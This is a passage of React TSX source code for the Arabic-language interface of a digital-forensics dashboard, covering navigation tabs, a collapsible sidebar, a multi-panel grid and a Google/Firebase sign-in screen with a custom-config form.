              <button onClick={() => handleSelectTab('asset_os_dashboard')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('asset_os_dashboard') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <PieChart className="w-4 h-4" />
                توزيع الأصول والأنظمة
              </button>
              <button onClick={() => handleSelectTab('reports')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('reports') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <FileText className="w-4 h-4" />
                التقارير الموثقة
              </button>
            </nav>
          ) : (
            <div className="hidden xl:flex items-center gap-2 text-xs text-gray-300 bg-gray-900/80 border border-gray-800 px-3.5 py-1.5 rounded-xl">
              <span className="text-[#D4AF37]">{renderTabIcon(activeTab as AppTabId, 'w-4 h-4')}</span>
              <span className="font-bold text-white">
                {NAV_TABS_META.find((t) => t.id === activeTab)?.label || 'لوحة التحكم'}
              </span>
              <span className="text-[10px] text-gray-500 font-mono px-1.5 border-r border-gray-700">
                {uiPrefs.layoutStructure === 'minimal_sidebar' ? 'MINIMAL RAIL' : 'SIDEBAR MODE'}
              </span>
            </div>
          )
        )}

        {/* Real Device Telemetry, UI Customizer & Firebase Auth Widget */}
        <div className="flex items-center gap-1 sm:gap-2 text-xs font-mono shrink-0">
          {authReady && user ? (
            <>
              {/* Dynamic Layout & UI Customizer + Instant Procedural Randomizer */}
              <div className="flex items-center gap-1">
                <button
                  type="button"
                  onClick={() => setShowLayoutCustomizer(true)}
                  title="فتح مُخصِّص الواجهة والهيكل الديناميكي (+540 ثيم)"
                  className="flex items-center gap-1.5 px-2 sm:px-3 py-1.5 bg-[#D4AF37]/15 hover:bg-[#D4AF37]/25 text-[#D4AF37] border border-[#D4AF37]/50 rounded-xl font-sans font-bold transition cursor-pointer shadow-sm"
                >
                  <Sliders className="w-3.5 h-3.5" />
                  <span className="hidden md:inline text-[11px]">تخصيص الهيكل والواجهة</span>
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const picked = pickRandomProceduralTheme(uiPrefs.proceduralThemeId);
                    updateUiPreferences({
                      themePreset: 'procedural',
                      proceduralThemeId: picked.id,
                    });
                    notifyStatus(`تم تطبيق الثيم الإجرائي #${picked.id.toUpperCase()}: ${picked.nameAr}`, 'success');
                  }}
                  title="تغيير عشوائي حقيقي فوري من +540 ثيم (Instant Theme Generator)"
                  className="flex items-center gap-1 px-2 sm:px-2.5 py-1.5 bg-gray-900/90 hover:bg-gray-800 text-[#D4AF37] border border-[#D4AF37]/40 rounded-xl font-sans font-bold transition cursor-pointer shadow-sm"
                >
                  <Dices className="w-3.5 h-3.5" />
                  <span className="hidden xl:inline text-[10px]">ثيم عشوائي</span>
                </button>
              </div>

              {/* Cloud Sync / Local Mode Indicator */}
              {isCloudAuthenticated && (
                <div
                  title="متصل بقاعدة بيانات Firestore السحابية والمصادقة الفعلية"
                  className="hidden md:flex items-center gap-1.5 px-2.5 py-1 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-lg font-sans font-bold"
                >
                  <Cloud className="w-3.5 h-3.5" />
                  <span className="text-[10px]">Firestore متصل</span>
                </div>
              )}

              {/* Master System Lock Button */}
              <button
                type="button"
                onClick={onLockSystem}
                title="قفل النظام والعودة لشاشة القفل الرئيسية"
                className="flex items-center gap-1.5 px-2.5 sm:px-3 py-1.5 bg-[#D4AF37]/15 hover:bg-[#D4AF37]/25 text-[#D4AF37] border border-[#D4AF37]/50 rounded-lg transition font-sans font-bold cursor-pointer shrink-0"
              >
                <Lock className="w-3.5 h-3.5" />
                <span className="text-[11px] whitespace-nowrap">قفل النظام</span>
              </button>

              {/* Panic Lock Button */}
              <button
                onClick={() => setIsLocked(true)}
                title="قفل الطوارئ الفوري (Panic Lock)"
                className="flex items-center gap-1 px-2 sm:px-2.5 py-1.5 bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 rounded-lg transition font-bold cursor-pointer"
              >
                <ShieldAlert className="w-3.5 h-3.5" />
                <span className="hidden 2xl:inline text-[10px]">قفل طوارئ</span>
              </button>

              {/* PWA / Android APK Install Button */}
              <PWAInstallButton />

              {/* Site Update Status Pill & Quick Action */}
              <button
                onClick={() => update.hasUpdate ? update.setShowModal(true) : update.checkForUpdates(true)}
                title={update.hasUpdate ? 'هذا الموقع يريد تحديث! انقر للتحديث الفوري' : 'فحص تحديثات الموقع'}
                className={`hidden md:flex items-center gap-1.5 px-2.5 py-1 rounded-lg border transition cursor-pointer ${
                  update.hasUpdate 
                    ? 'bg-amber-950/80 border-[#D4AF37] text-[#D4AF37] animate-pulse font-bold shadow-lg shadow-[#D4AF37]/20' 
                    : 'bg-gray-900 border-gray-800 text-gray-300 hover:border-[#D4AF37]/50'
                }`}
              >
                <RefreshCw className={`w-3.5 h-3.5 ${update.isChecking ? 'animate-spin text-[#D4AF37]' : ''}`} />
                <span>v{APP_CURRENT_VERSION}</span>
              </button>

              <div className="hidden 2xl:flex items-center gap-1.5 px-3 py-1 rounded-lg bg-gray-900 border border-gray-800 text-gray-300">
                {batteryInfo.charging ? <BatteryCharging className="w-3.5 h-3.5 text-[#10B981]" /> : <Battery className="w-3.5 h-3.5 text-[#D4AF37]" />}
                <span>{batteryInfo.level}%</span>
              </div>

              <div className="hidden 2xl:flex items-center gap-1.5 px-3 py-1 rounded-lg bg-gray-900 border border-gray-800 text-gray-300">
                <Wifi className={`w-3.5 h-3.5 ${networkInfo.online ? 'text-[#10B981]' : 'text-red-500'}`} />
                <span>{networkInfo.online ? networkInfo.type : 'غير متصل'}</span>
              </div>

              <button 
                onClick={() => handleSelectTab('profile')}
                className="flex items-center gap-1.5 sm:gap-2 bg-gray-900 px-2 sm:px-3 py-1.5 rounded-lg border border-gray-800 hover:border-[#D4AF37] transition group cursor-pointer"
              >
                {userProfile?.photoURL ? (
                  <img src={userProfile.photoURL} alt="Avatar" className="w-5 h-5 rounded-full object-cover" />
                ) : (
                  <UserIcon className="w-3.5 h-3.5 text-gray-400 group-hover:text-[#D4AF37]" />
                )}
                <span className="hidden sm:inline text-white font-medium truncate max-w-[90px] sm:max-w-[110px]">{userProfile?.displayName || user.email}</span>
              </button>
            </>
          ) : (
            <div className="flex items-center gap-2">
              <div className="hidden sm:flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-gray-900 border border-gray-800 text-gray-400 font-sans text-[11px]">
                <Lock className="w-3.5 h-3.5 text-[#D4AF37]" />
                <span>المصادقة عبر Google مطلوبة</span>
              </div>
              <button
                type="button"
                onClick={onLockSystem}
                title="قفل النظام والعودة لشاشة القفل الرئيسية"
                className="flex items-center gap-1.5 px-2.5 sm:px-3 py-1.5 bg-[#D4AF37]/15 hover:bg-[#D4AF37]/25 text-[#D4AF37] border border-[#D4AF37]/50 rounded-lg transition font-sans font-bold cursor-pointer shrink-0"
              >
                <Lock className="w-3.5 h-3.5" />
                <span className="text-[11px] whitespace-nowrap">قفل النظام</span>
              </button>
            </div>
          )}
        </div>
      </header>

      {/* Main Workspace Frame (Supports Top Navbar, Collapsible Vertical Sidebar & Multi-Panel Grid) */}
      <div className="flex-1 flex min-h-0 relative">
        {/* Smart Collapsible / Minimal Vertical Sidebar */}
        {isSidebarMode && authReady && user && (
          <>
            {mobileSidebarOpen && (
              <div
                onClick={() => setMobileSidebarOpen(false)}
                className="fixed inset-0 z-40 bg-black/70 backdrop-blur-sm lg:hidden"
              />
            )}
            <aside
              className={`${
                mobileSidebarOpen ? 'fixed inset-y-0 right-0 z-50 flex' : 'hidden lg:flex'
              } flex-col shrink-0 bg-gray-950/95 border-l border-gray-800 transition-all duration-200 ${
                uiPrefs.layoutStructure === 'minimal_sidebar'
                  ? 'w-[68px]'
                  : effectiveSidebarCollapsed
                  ? 'w-[76px]'
                  : 'w-72'
              }`}
            >
              {/* Sidebar Header & Collapse Button */}
              {uiPrefs.layoutStructure !== 'minimal_sidebar' && (
                <div className="p-3 border-b border-gray-800 flex items-center justify-between gap-2">
                  {!effectiveSidebarCollapsed && (
                    <span className="text-xs font-bold text-[#D4AF37] tracking-wide truncate">
                      مختبرات التحقيق السيادي
                    </span>
                  )}
                  <button
                    type="button"
                    onClick={() => updateUiPreferences({ sidebarCollapsed: !uiPrefs.sidebarCollapsed })}
                    title={effectiveSidebarCollapsed ? 'توسيع القائمة الجانبية' : 'طي القائمة الجانبية'}
                    className="p-2 rounded-xl bg-gray-900 hover:bg-gray-800 border border-gray-800 text-gray-300 hover:text-[#D4AF37] transition cursor-pointer mx-auto lg:mx-0"
                  >
                    {effectiveSidebarCollapsed ? (
                      <PanelRightOpen className="w-4 h-4" />
                    ) : (
                      <PanelRightClose className="w-4 h-4" />
                    )}
                  </button>
                </div>
              )}

              {/* Quick Filter inside Expanded Sidebar */}
              {!effectiveSidebarCollapsed && uiPrefs.layoutStructure === 'sidebar' && (
                <div className="p-3 border-b border-gray-800/70">
                  <div className="relative">
                    <Search className="w-3.5 h-3.5 text-gray-500 absolute right-3 top-1/2 -translate-y-1/2" />
                    <input
                      type="text"
                      value={sidebarSearch}
                      onChange={(e) => setSidebarSearch(e.target.value)}
                      placeholder="بحث سريع عن مختبر..."
                      className="w-full pr-8 pl-3 py-1.5 bg-gray-900 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none"
                    />
                  </div>
                </div>
              )}

              {/* Grouped Navigation Items */}
              <div className="flex-1 overflow-y-auto p-2.5 space-y-4">
                {(['command', 'labs', 'evidence', 'system'] as const).map((groupKey) => {
                  const groupItems = NAV_TABS_META.filter(
                    (item) =>
                      item.group === groupKey &&
                      (uiPrefs.layoutStructure === 'minimal_sidebar' ||
                        !sidebarSearch.trim() ||
                        item.label.toLowerCase().includes(sidebarSearch.toLowerCase()) ||
                        item.shortLabel.toLowerCase().includes(sidebarSearch.toLowerCase()))
                  );
                  if (groupItems.length === 0) return null;
                  return (
                    <div key={groupKey} className="space-y-1">
                      {!effectiveSidebarCollapsed && (
                        <div className="px-2.5 py-1 text-[10px] font-bold text-gray-500 uppercase tracking-wider">
                          {groupItems[0].groupLabel}
                        </div>
                      )}
                      {groupItems.map((item) => {
                        const isActive = activeTab === item.id;
                        return (
                          <button
                            key={item.id}
                            type="button"
                            onClick={() => handleSelectTab(item.id)}
                            title={item.label}
                            className={`w-full flex items-center ${
                              effectiveSidebarCollapsed ? 'justify-center px-2' : 'justify-between px-3'
                            } py-2.5 rounded-xl text-xs font-medium transition cursor-pointer ${
                              isActive
                                ? 'bg-[#D4AF37]/15 text-[#D4AF37] border border-[#D4AF37]/40 font-bold'
                                : 'text-gray-300 hover:bg-gray-900 hover:text-white border border-transparent'
                            }`}
                          >
                            <div className="flex items-center gap-2.5 min-w-0">
                              <span className="shrink-0">{renderTabIcon(item.id, 'w-4 h-4')}</span>
                              {!effectiveSidebarCollapsed && <span className="truncate">{item.label}</span>}
                            </div>
                            {!effectiveSidebarCollapsed && item.id === 'live_feeds' && liveFeedsAutoSync && (
                              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse shrink-0" />
                            )}
                          </button>
                        );
                      })}
                    </div>
                  );
                })}
              </div>
            </aside>
          </>
        )}

      {/* Main Content */}
      <main
        className={`flex-1 w-full mx-auto min-w-0 ${
          uiPrefs.layoutStructure === 'full_width_stack'
            ? 'max-w-none px-4 md:px-10 py-6 space-y-6'
            : uiPrefs.layoutStructure === 'compact_dashboard'
            ? 'max-w-[1560px] p-3 md:p-4 space-y-3'
            : uiPrefs.layoutStructure === 'multi_grid'
            ? 'max-w-[1720px] p-4 md:p-6 space-y-6'
            : uiPrefs.layoutStructure === 'minimal_sidebar'
            ? 'max-w-6xl p-4 md:p-6 space-y-6'
            : 'max-w-7xl p-4 md:p-6 space-y-6'
        }`}
      >
        
        {/* Mobile Nav (always accessible on mobile/tablet after Google Sign-In) */}
        {authReady && user && (
          <div className={`flex ${isSidebarMode ? 'lg:hidden' : 'xl:hidden'} overflow-x-auto gap-2 pb-2 border-b border-gray-800`}>
            <button onClick={() => handleSelectTab('dashboard')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('dashboard') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>الرئيسية</button>
            <button onClick={() => handleSelectTab('analyzer')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('analyzer') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>التحليل</button>
            <button onClick={() => handleSelectTab('evidence')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('evidence') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>الأدلة</button>
            <button onClick={() => handleSelectTab('custody')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('custody') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>سلسلة الحيازة</button>
            <button onClick={() => handleSelectTab('email')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('email') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>البريد</button>
            <button onClick={() => handleSelectTab('clipboard')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('clipboard') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>الحافظة</button>
            <button onClick={() => handleSelectTab('search')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('search') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>OSINT</button>
            <button onClick={() => handleSelectTab('ela')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('ela') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>ELA</button>
            <button onClick={() => handleSelectTab('hex')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('hex') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>Hex</button>
            <button onClick={() => handleSelectTab('audit')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('audit') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>السجل</button>
            <button onClick={() => handleSelectTab('comparison')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('comparison') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>المقارنة</button>
            <button onClick={() => handleSelectTab('parser')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('parser') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>محلل السجلات</button>
            <button onClick={() => handleSelectTab('apk')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('apk') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>تحليل APK</button>
            <button onClick={() => handleSelectTab('browser')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('browser') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>سجل المتصفح</button>
            <button onClick={() => handleSelectTab('threat_intel')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('threat_intel') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>الاستخبارات العالمية</button>
            <button onClick={() => handleSelectTab('deobfuscator')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('deobfuscator') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>فك تشويه السكربتات</button>
            <button onClick={() => handleSelectTab('binary_lab')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('binary_lab') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>تحليل الباينري PE/ELF</button>
            <button onClick={() => handleSelectTab('live_feeds')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('live_feeds') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>التغذيات الحية</button>
            <button onClick={() => handleSelectTab('breach_lookup')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('breach_lookup') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>فحص التسريبات</button>
            <button onClick={() => handleSelectTab('archive_extractor')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('archive_extractor') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>تحليل الأرشيف</button>
            <button onClick={() => handleSelectTab('ssl_inspector')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('ssl_inspector') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>شهادات SSL</button>
            <button onClick={() => handleSelectTab('ip_mapper')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('ip_mapper') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>خريطة الـ IP</button>
            <button onClick={() => handleSelectTab('malware_hash')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('malware_hash') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>بصمات الفيروسات</button>
            <button onClick={() => handleSelectTab('pdf_forensics')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('pdf_forensics') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>محلل PDF</button>
            <button onClick={() => handleSelectTab('url_tracer')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('url_tracer') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>متتبع الروابط</button>
            <button onClick={() => handleSelectTab('steg_inspector')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('steg_inspector') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>كاشف الإخفاء LSB</button>
            <button onClick={() => handleSelectTab('cyber_telemetry')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('cyber_telemetry') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>تدفق الشبكة SOC</button>
            <button onClick={() => handleSelectTab('vuln_kev_dashboard')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('vuln_kev_dashboard') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>ثغرات KEV</button>
            <button onClick={() => handleSelectTab('asset_os_dashboard')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('asset_os_dashboard') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>الأصول والأنظمة</button>
            <button onClick={() => handleSelectTab('reports')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('reports') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>التقارير الموثقة</button>
            <button onClick={() => handleSelectTab('profile')} className={`px-3 py-1.5 text-xs rounded-lg whitespace-nowrap ${isTabVisible('profile') ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-900 text-gray-300'}`}>الحساب</button>
          </div>
        )}

        {/* Multi-Panel Dashboard Grid Workspace Controller Bar */}
        {uiPrefs.layoutStructure === 'multi_grid' && authReady && user && (
          <div className="bg-gray-900/90 border border-[#D4AF37]/40 rounded-2xl p-4 shadow-xl flex flex-col lg:flex-row lg:items-center justify-between gap-3">
            <div className="flex items-center gap-2.5 flex-wrap">
              <div className="flex items-center gap-2 text-xs font-bold text-[#D4AF37] ml-2">
                <LayoutGrid className="w-4 h-4" />
                <span>الشبكة المتعددة النشطة ({uiPrefs.multiGridPanels.length} لوحات):</span>
              </div>
              {uiPrefs.multiGridPanels.map((panelId) => {
                const meta = NAV_TABS_META.find((t) => t.id === panelId);
                return (
                  <div
                    key={panelId}
                    className="flex items-center gap-1.5 px-2.5 py-1 rounded-xl bg-gray-950 border border-[#D4AF37]/30 text-xs text-white"
                  >
                    <span className="text-[#D4AF37]">{renderTabIcon(panelId, 'w-3.5 h-3.5')}</span>
                    <span>{meta?.shortLabel || panelId}</span>
                    {uiPrefs.multiGridPanels.length > 1 && (
                      <button
                        type="button"
                        onClick={() =>
                          updateUiPreferences({
                            multiGridPanels: uiPrefs.multiGridPanels.filter((p) => p !== panelId),
                          })
                        }
                        className="text-gray-400 hover:text-red-400 transition cursor-pointer"
                        title="إزالة اللوحة من الشبكة"
                      >
                        <X className="w-3.5 h-3.5" />
                      </button>
                    )}
                  </div>
                );
              })}
            </div>
            <div className="flex items-center gap-2 shrink-0 flex-wrap">
              <div className="flex items-center gap-1 bg-gray-950 p-1 rounded-xl border border-gray-800">
                <button
                  type="button"
                  onClick={() => updateUiPreferences({ multiGridColumns: 2 })}
                  className={`px-2.5 py-1 rounded-lg text-[11px] font-bold flex items-center gap-1 cursor-pointer ${
                    uiPrefs.multiGridColumns === 2 ? 'bg-[#D4AF37] text-gray-950' : 'text-gray-400'
                  }`}
                >
                  <Columns className="w-3 h-3" />
                  عمودان
                </button>
                <button
                  type="button"
                  onClick={() => updateUiPreferences({ multiGridColumns: 3 })}
                  className={`px-2.5 py-1 rounded-lg text-[11px] font-bold flex items-center gap-1 cursor-pointer ${
                    uiPrefs.multiGridColumns === 3 ? 'bg-[#D4AF37] text-gray-950' : 'text-gray-400'
                  }`}
                >
                  <LayoutGrid className="w-3 h-3" />
                  3 أعمدة
                </button>
              </div>
              <button
                type="button"
                onClick={() => setShowLayoutCustomizer(true)}
                className="px-3 py-1.5 rounded-xl bg-[#D4AF37]/15 hover:bg-[#D4AF37]/25 border border-[#D4AF37]/40 text-[#D4AF37] text-xs font-bold cursor-pointer"
              >
                + إدارة اللوحات
              </button>
              <button
                type="button"
                onClick={() => updateUiPreferences({ layoutStructure: 'top' })}
                className="px-3 py-1.5 rounded-xl bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-bold cursor-pointer"
              >
                العودة لعرض اللوحة الواحدة
              </button>
            </div>
          </div>
        )}

        {!authReady ? (
          <div className="max-w-md mx-auto py-20">
            <div className="bg-gray-900 border border-gray-800 rounded-3xl p-8 shadow-2xl text-center space-y-4">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#D4AF37] to-[#10B981] flex items-center justify-center shadow-2xl mx-auto">
                <Lock className="w-8 h-8 text-gray-950 animate-pulse" />
              </div>
              <h2 className="text-xl font-bold text-white tracking-tight">جاري التحقق من المصادقة</h2>
              <p className="text-gray-400 text-xs leading-relaxed">
                يتم التحقق من جلسة حساب Google عبر Firebase Authentication...
              </p>
            </div>
          </div>
        ) : !user ? (
          <div className="max-w-md mx-auto py-12 space-y-8">
            <div className="text-center space-y-2">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#D4AF37] to-[#10B981] flex items-center justify-center shadow-2xl mx-auto mb-6">
                <Lock className="w-8 h-8 text-gray-950" />
              </div>
              <h2 className="text-2xl font-bold text-white tracking-tight">نظام المصادقة السيادي</h2>
              <p className="text-gray-400 text-sm leading-relaxed">
                تسجيل الدخول باستخدام حساب Google إلزامي للوصول إلى وحدة التحقيق الجنائي والأدلة الرقمية.
              </p>
            </div>

            <div className="bg-gray-900 border border-gray-800 rounded-3xl p-8 shadow-2xl space-y-6">
              <button
                type="button"
                onClick={handleGoogleLogin}
                disabled={authLoading}
                className="w-full py-4 bg-white hover:bg-gray-100 text-gray-900 font-bold rounded-2xl shadow-xl transition flex items-center justify-center gap-3 text-sm disabled:opacity-50 cursor-pointer"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24">
                  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
                  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
                </svg>
                {authLoading ? 'جاري المصادقة عبر Google...' : 'تسجيل الدخول باستخدام Google'}
              </button>

              {authError && (
                <div className="p-3.5 bg-red-500/10 border border-red-500/30 rounded-xl text-[11px] text-red-300 space-y-2.5">
                  <div className="font-mono leading-relaxed">{authError}</div>
                  {authError.includes('auth/unauthorized-domain') && (
                    <div className="pt-2 border-t border-red-500/20 space-y-2">
                      <div className="flex flex-wrap gap-2">
                        <button
                          type="button"
                          onClick={() => navigator.clipboard?.writeText(window.location.hostname)}
                          className="px-2.5 py-1.5 rounded-lg bg-gray-900 hover:bg-gray-800 border border-gray-700 text-white text-[10px] font-bold flex items-center gap-1.5 cursor-pointer"
                        >
                          <Copy className="w-3 h-3 text-[#D4AF37]" />
                          نسخ النطاق ({window.location.hostname})
                        </button>
                        <a
                          href={`https://console.firebase.google.com/project/${encodeURIComponent(firebaseConfig.projectId)}/authentication/settings`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="px-2.5 py-1.5 rounded-lg bg-[#D4AF37]/15 hover:bg-[#D4AF37]/25 border border-[#D4AF37]/40 text-[#D4AF37] text-[10px] font-bold flex items-center gap-1.5"
                        >
                          <ExternalLink className="w-3 h-3" />
                          فتح إعدادات النطاقات في Firebase
                        </a>
                        <button
                          type="button"
                          onClick={() => {
                            setShowCustomFirebasePanel((v) => !v);
                            setCustomFirebaseError(null);
                          }}
                          className="px-2.5 py-1.5 rounded-lg bg-gray-900 hover:bg-gray-800 border border-gray-700 text-emerald-400 text-[10px] font-bold cursor-pointer"
                        >
                          {showCustomFirebasePanel ? 'إخفاء الربط المخصص' : 'أو ربط مشروع Firebase خاص بك'}
                        </button>
                      </div>

                      {(showCustomFirebasePanel || isUsingCustomFirebaseConfig) && (
                        <div className="p-2.5 rounded-lg bg-gray-950 border border-gray-800 space-y-2">
                          <div className="flex items-center justify-between">
                            <span className="text-[10px] font-bold text-white">الصق firebaseConfig لمشروعك الخاص:</span>
                            {isUsingCustomFirebaseConfig && (
                              <button
                                type="button"
                                onClick={resetCustomFirebaseConfig}
                                className="text-[10px] text-red-400 hover:underline cursor-pointer"
                              >
                                استعادة الافتراضي
                              </button>
                            )}
                          </div>
                          <textarea
                            rows={3}
                            dir="ltr"
                            value={customFirebaseRaw}
                            onChange={(e) => {
                              setCustomFirebaseRaw(e.target.value);
                              setCustomFirebaseError(null);
                            }}
                            placeholder={'{\n  "apiKey": "AIza...",\n  "authDomain": "your-app.firebaseapp.com",\n  "projectId": "your-app",\n  "appId": "1:...:web:..."\n}'}
                            className="w-full p-2 bg-gray-900 border border-gray-800 rounded-lg text-[10px] font-mono text-emerald-300 outline-none"
                          />
                          {customFirebaseError && (
                            <p className="text-[10px] text-red-400">{customFirebaseError}</p>
                          )}
                          <button
                            type="button"
                            onClick={() => {
                              const parsed = parseFirebaseConfigInput(customFirebaseRaw);
                              if (!parsed) {
                                setCustomFirebaseError('تأكد من احتواء الكود على apiKey و authDomain و projectId و appId.');
                                return;
                              }
                              saveCustomFirebaseConfig(parsed);
                            }}
                            className="w-full py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-[10px] rounded-lg cursor-pointer"
                          >
                            حفظ المشروع المخصص وإعادة التحميل
                          </button>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}

              <div className="pt-4 border-t border-gray-800 text-center space-y-2.5">
                <p className="text-xs text-gray-400 font-medium">
                  الوصول مقيد بحسابات Google عبر Firebase Authentication فقط.
                </p>
                <div
                  dir="ltr"
                  className={`inline-flex items-center gap-2 px-3 py-1 rounded-full border text-[10px] font-mono ${
                    domainVerification.isRecognizedDomain
                      ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
                      : 'bg-amber-500/10 border-amber-500/30 text-amber-300'
                  }`}
                >
                  <CheckCircle2 className="w-3 h-3 shrink-0" />
                  <span>{domainVerification.hostname}</span>
                </div>
                {!domainVerification.isRecognizedDomain && (
                  <div className="pt-1">
                    <a
                      href={domainVerification.canonicalUrl}
                      className="inline-flex items-center gap-1.5 text-[11px] font-bold text-[#D4AF37] hover:underline"
                    >
                      <ExternalLink className="w-3 h-3" />
